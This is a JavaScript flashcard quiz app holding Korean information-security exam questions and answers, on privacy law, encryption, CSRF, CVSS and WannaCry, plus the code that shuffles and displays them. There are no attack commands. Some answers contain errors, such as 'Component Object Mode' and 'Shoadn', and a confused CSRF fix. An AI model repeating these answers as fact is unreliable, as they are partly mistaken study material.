xml+='  <problem id="562">정보통신서비스 제공자등은 이용자의 개인정보를 처리하는 &lt;br&gt;경우에는 (               )을 정하여 이용자가 언제든지 &lt;br&gt;쉽게 확인할 수 있도록 공개하여야 한다. &lt;br&gt;위 괄호에 들어갈 말로 옳은 것은?</problem>';
xml+='  <answer id="562">개인정보 처리방침</answer>';
xml+='  <problem id="563">정보통신망법에서 개인정보 유출 시, &lt;br&gt;신고하여야 하는곳/통지 사항/ 시기/ 통지방법은?</problem>';
xml+='  <answer id="563">방송통신 위원회, 개인정보보호법과 같음, &lt;br&gt;24시간 이내, 인터넷 홈페이지 30일 이상 게시</answer>';
xml+='  <problem id="564">정보통신망법에 따른 개인정보의 안정성 확보를 위한 &lt;br&gt;기술적/관리적 조치 5가지는?</problem>';
xml+='  <answer id="564">1) 내부 관리 계획 수립/시행&lt;br&gt;2) 접근통제 장치 설치/운영&lt;br&gt;3) 접속기록 위/변조 방지를 위한 조치&lt;br&gt;4) 암호화&lt;br&gt;5) 백신 소프트웨어 설치/운영</answer>';
xml+='  <problem id="565">개인정보의 기술적/관리적 보호조치 기준에서 접속 기록 항목은?</problem>';
xml+='  <answer id="565">식별자, 접속일시, 접속지를 알 수 있는 정보, 수행 업무</answer>';
xml+='  <problem id="566">전년도 말 기준 직전 (     A       ) 그 개인정보가 저장/관리되고 &lt;br&gt;있는 이용자 수가 (       B       )이거나 정보통신서비스 부문 &lt;br&gt;전년도 (        C        )인 정보통신서비스 제공자들은 &lt;br&gt;개인정보처리시스템에서 개인정보를 (   D    )또는 (   E    ) 할 수 &lt;br&gt;있거나 개인정보처리시스템에 대한 (      F         ) 수 있는 &lt;br&gt;개인정보취급자의 컴퓨터 등을 (           G             )하여야 한다. </problem>';
xml+='  <answer id="566">A : 3개월간 &lt;br&gt;B : 일일 평균 100만명 이상&lt;br&gt;C : 매출액이 100억원 이상&lt;br&gt;D : 다운로드&lt;br&gt;E : 파기&lt;br&gt;F : 접근권한 설정&lt;br&gt;G : 물리적 또는 논리적으로 망분리</answer>';
xml+='  <problem id="567">정보통신서비스 제공자가 운용하는 개인정보파일에서&lt;br&gt;최소한의 암호화가 필요한 항목과 각 항목별 안정성 기준 &lt;br&gt;및 암호 알고리즘은?</problem>';
xml+='  <answer id="567">최소한의 암호화가 필요한 항목은 &lt;br&gt;주민등록번호, 운전면허번호, 여권번호, 외국인등록번호, &lt;br&gt;바이오 정보, 비밀번호, 계좌번호, 신용카드번호가 있다. &lt;br&gt;&lt;br&gt;비밀번호는 일방향 해시 알고리즘인 SHA-2이상 &amp; 솔트를 통해 &lt;br&gt;암호화하고 나머지는 대칭키 알고리즘(SEED,ARIA,AES),&lt;br&gt;공개키 알고리즘 ( 키 길이 2048bit 이상의 RSA )를 통해 &lt;br&gt;암호화 한다.</answer>';
xml+='  <problem id="568">정보통신서비스 제공자등은 정보통신망을 통해 이용자의 &lt;br&gt;개인 정보 및 인증정보를 송/수신할 때에는 안전한 (        )구축 &lt;br&gt;등의 조치를 통해 이를 암호화 해야 한다. &lt;br&gt;(                )는 어떤한 기능을 갖추어야 하는가?</problem>';
xml+='  <answer id="568">보안서버, SSL 인증서 설치/보안 응용프로그램 설치</answer>';
xml+='  <problem id="569">호스트 컴퓨터에서 &lt;br&gt;다수의 운영체제를 동시에 실행하기 위한 논리적 플랫폼은?</problem>';
xml+='  <answer id="569">하이퍼 바이저(hypervisor)</answer>';
xml+='  <problem id="570">논리적 망분리 특징을 서술하시오.</problem>';
xml+='  <answer id="570">인터넷 환경이 악성코드나 해킹에 노출되도 업무 환경은 안전하다. &lt;br&gt;단점은 여러 사용자가 가상화 서버를 이용해 트래픽 증가 및 &lt;br&gt;속도 저하가 있을 수 있다.</answer>';
xml+='  <problem id="571">다음 괄호 안에 들어갈 공통의 용어로 알맞은 것은? &lt;br&gt;&lt;br&gt;(  )는 MS에서 개발한 SW 구성 요소들의 응용 프로그램 이진 인터페이스로써&lt;br&gt;최근 하드디스크에서 제거된 파일들을 참조하는 (  ) 객체 ID(CLSID)를&lt;br&gt;하이재킹하여 악성 파일을 가리키게 한 뒤 임의의 파일을 실행하는 문제점이 발견됐다.</problem>';
xml+='  <answer id="571">COM(Component Object Mode)</answer>';
xml+='  <problem id="572">스피어피싱은 일반인도 알아보기 쉬운 스팸형 공격과는 다르게 &lt;br&gt;특정 개인이나 단체를 위해 제작된 피싱을 일컫는다.  &lt;br&gt;공격 대상 관점에 따른 일반 피싱과 스피어 피싱의 차이점을 서술하시오.</problem>';
xml+='  <answer id="572">일반 피싱은 불특정 다수에게 마구 흩뿌려진다. &lt;br&gt;그런 공격은 일반인들도 쉽게 인지하여 큰 위협이 없다. &lt;br&gt;그러나 스피어 피싱은 공격 대상 기업 정보 및 SNS 등을 활용하여 &lt;br&gt;모든 정보를 취합해서 훨씬 신뢰하기 좋은 개인 맞춤형 피싱을 만든다.&lt;br&gt;</answer>';
xml+='  <problem id="573">오픈 소스 저작물인 워드프레스 5.1.1 이전 버전에서 나타나는 취약점으로 새 댓글 작성 시 (  ) 검사를 하지 않아 공격자가 관리자의 &lt;br&gt;이름으로 댓글 작성이 가능하다.&lt;br&gt; 괄호 안에 들어갈 알맞은 말과 해당 취약점의 위협 이유 및 대응 방안을 서술하시오.</problem>';
xml+='  <answer id="573">A : CSRF(Cross-site request forgery)&lt;br&gt;위협 이유 : HTML 태그 기능이 켜져 있다면 CSRF를 남용하여 &lt;br&gt;악성 자바스크립트를 실행시킬 수 있다.&lt;br&gt;대응 방안 : 워드프레스 5.1.1 버전 이상이 나올 때까지 댓글 기능을 임시로 비활성화하고, 다음 패치가 적용되면 사용한다.</answer>';
xml+='  <problem id="574">다음에서 설명하는 시스템명은?&lt;br&gt;컴퓨터 시스템 보안의 심각도 및 위험을 평가하는데 사용한다. &lt;br&gt;보안 취약점 위험도에 따라서 다음처럼 점수에 따른 심각성이 분류된다.&lt;br&gt;1) 저위험군 : 0.1~3.9점&lt;br&gt;2) 중위험군 : 4.0~6.9점&lt;br&gt;3) 고위험군 : 7.0~8.9점&lt;br&gt;4) 치명적 위험군 : 9.0~10.0점&lt;br&gt;&lt;br&gt;위 점수에 따라서 심각성이 높은 취약점을 &lt;br&gt;우선 패치하는 등의 역할로 쓰이고 있다.</problem>';
xml+='  <answer id="574">CVSS(Common Vulnerability Scoring System)</answer>';
xml+='  <problem id="575">랜섬웨어 예방법을 관리적 관점에서 세 가지 서술하시오.</problem>';
xml+='  <answer id="575">중요한 자산을 우선 식별하고 시스템 운영 환경을 이해해야 한다.&lt;br&gt;그 후 보안체계에 대한 패치를 지속해서 하고 &lt;br&gt;보안 사고 사례를 주의 깊게 살피어 예방할 것이 있는지 확인한다.&lt;br&gt;또한 보안에서는 가장 약한 고리가 사람이므로,  &lt;br&gt;트레이닝 프로그램을 통해서 예방 교육을 한다.</answer>';
xml+='  <problem id="576">파워쉘은 윈도우 7 이상 버전에서 기본적으로 탑재된 쉘 프로그램인데 &lt;br&gt;최근 악성코드를 유포하거나 악성코드 자체에서 &lt;br&gt;파워쉘(Powershell) 스크립트를 사용하는 유형이 많이 발견되고 있다. &lt;br&gt;공격자들이 사이버 공격에 파워쉘을 활용한 기법을 자주 사용하는데, 그 이유 세 가지를 서술하라.</problem>';
xml+='  <answer id="576">1. 모든 윈도 시스템에 기본 제공 되며 활성화됀다.&lt;br&gt;2. 파워쉘은 자동화 작업 활용이 용이하여 차단할 가능성이 낮다.&lt;br&gt;3. 관리자 권한으로 실행할 수 있다.&lt;br&gt;4. 오픈소스라 연구하기 용이하다.</answer>';
xml+='  <problem id="577">“보안 취약점을 가진 시스템”을 찾아 내어, 보안을 강화하기 위한 &lt;br&gt;수단으로 웹캠, CCTV, 라우터, 스위치, FTP, 특정 웹 서버(IIS, Apache등)에 대한 정보를 수집하고 그 결과를 보여주는 검색엔진은?</problem>';
xml+='  <answer id="577">쇼단(Shoadn)</answer>';
xml+='  <problem id="578">컴퓨터 시스템을 감염시켜 접근을 제한하고 일종의 몸값을 &lt;br&gt;요구하는 랜섬웨어 중 워너크라이에 대해 설명하시오.</problem>';
xml+='  <answer id="578">2017년 5월 12일 마이크로소포트 윈도우의 파일공유에 사용하는 &lt;br&gt;SMB 원격코드의 취약점을 악용한 랜섬웨어다.&lt;br&gt;</answer>';
xml+='</problems>';


xml = replaceAll(xml,"&lt;br&gt;","\n");

var xmlDoc= $.parseXML(xml); //xml 파일로 만든다.

var problem = [];
var answer = [];
var random = [];
var my_ans = "";
var idx; // 푼 문제
var flag = 0; // 내가 제출한 답 보기
var fin_flag = 0; // 답 제출 금지

$(xmlDoc).find("problem").each(function(index){     
  problem.push( $(this).text() );
}); 
$(xmlDoc).find("answer").each(function(index){     
  answer.push( $(this).text() );
});
var prob_cnt = $(xmlDoc).find("problem").length;

random_prob();

    
function view_answer()
{
  if ( flag == 0 )
  {
    my_ans = $("#answer_text").val();
    $("#view_ans").attr('value',"나의 답 보기");
    $("#view_ans").css('font-size',"1.5em");
    $("#view_ans").css('background',"skyblue");
    
    $("#answer_text").css('color',"#043927");
    $("#answer_text").attr('disabled','disabled');
    
    flag = 1;
    
    if ( fin_flag == 0 )
    $("#answer_text").val( answer[random[idx]] );
  } else {
    
    $("#answer_text").val( my_ans );
    but_init();
  }
  
  
  
}
function next_prob()
{
  if ( prob_cnt-1 > idx )
  { 
    ++idx; 
    but_init();
    prob_func();
   
  } else { $("#problem_text").val("👍 모든 문제를 푸셨습니다. ^^");
           $("#answer_text").val("👍 모든 문제를 푸셨습니다. ^^");
           fin_flag = 1;
           $("#view_ans").hide();
           $("#next_pro").hide();
           $("#prev_pro").hide();
           $("#answer_text").attr('disabled',true);
          
           $("#problem_area").html("");
           $("#solv_prob").html("<font color='blue'>👍 " + prob_cnt + " 문제를 모두 푸셨습니다 👍</font><br /><font color='#2e77bb'>문제를 다시 풀고 싶다면 상단에 문제 초기화 버튼을 눌러주세요. ^^</font> ");
         }
   
}
function prev_prob()
{
  if ( 0 < idx )
  { 
    --idx;
    but_init();
    prob_func();
  }
}
function random_prob()
{ 
  random = [];
  for (var i = 0; i< problem.length; i++)
  random.push(i);
  shuffle(random);

  // init()
  idx = -1;
  fin_flag = 0;
  flag = 0;
  my_ans = "";
  $("#answer_text").val("");
  $("#view_ans").show();
  $("#next_pro").show();
  $("#prev_pro").show();
  
  but_init();
  $("#solv_prob").html("");
  next_prob(); // 바로 다음 문제
}

function shuffle(a) { 
    var j, x, i; 
    for (i = a.length; i; i -= 1) { 
        j = Math.floor(Math.random() * i); 
        x = a[i - 1]; 
        a[i - 1] = a[j]; 
        a[j] = x; 
    } 
} 

function but_init()
{
  flag = 0;
  $("#view_ans").attr('value',"답안 보기");
  $("#view_ans").css('font-size',"2em");
  $("#view_ans").css('background',"blue");
  $("#answer_text").css('color',"#00004B");
  $("#answer_text").attr('disabled',false);
}
function prob_func()
{
  $("#answer_text").val("");
  $("#problem_area").html("<font color='dodgerblue' size='6px'><b>→ "+ (idx+1) +"번 문제 ←</b></font>"); 
  $("#problem_text").val( problem[random[idx]] );
 
}
function replaceAll(str, searchStr, replaceStr) {
  return str.split(searchStr).join(replaceStr);
}

$(".size_do").click(function() {
		var $speech = $("textarea");
		var currentSize = $speech.css("fontSize");	
		var num = parseFloat(currentSize, 10);	
		var unit = currentSize.slice(-2);	
    
    if ( num > 11 ) 	--num;
    $speech.css("fontSize",num);

});

$(".size_up").click(function() {
		var $speech = $("textarea");
		var currentSize = $speech.css("fontSize");	
		var num = parseFloat(currentSize, 10);	
		var unit = currentSize.slice(-2);	
    
    if ( num < 28 ) 	++num;
    $speech.css("fontSize",num);
  // alert(unit);
});

function size_max()
{
  var $speech = $("textarea");
  var currentSize = $speech.css("fontSize",'28px');
}
function size_min()
{
  var $speech = $("textarea");
  var currentSize = $speech.css("fontSize",'11px');
}

// modal
var problem_form1 = '<center><font size="10em" color="red"><b>문제</b></font></center>';
var problem_form2 = '<center><font size="10em" color="blue"><b>답안</b></font></center>';

var ans_view_but = '<center><br><br><br><br><br><br><br><br><br><br><br><input type="button" style="font-size:45px;" onclick="full_ans_click()" value="답안 보기"> </center>';


function full_scr()
{
  $('#myModal').show();

 var full_problem = replaceAll(problem[random[idx]],'\n','<br>');
  
  $(".modal-content").html(problem_form1 + "<font size='4em'>" +  full_problem + "</font>");
  
  $(".modal-content2").html(ans_view_but);
  
}
function close_pop(flag) {
  $('#myModal').hide();
  
};

function full_ans_click() {

  var full_answer = replaceAll(answer[random[idx]],'\n','<br>');
  
  
  $(".modal-content2").html(problem_form2 + "<font size='4em'>" +  full_answer + "</font>");
  
};
 

</script>


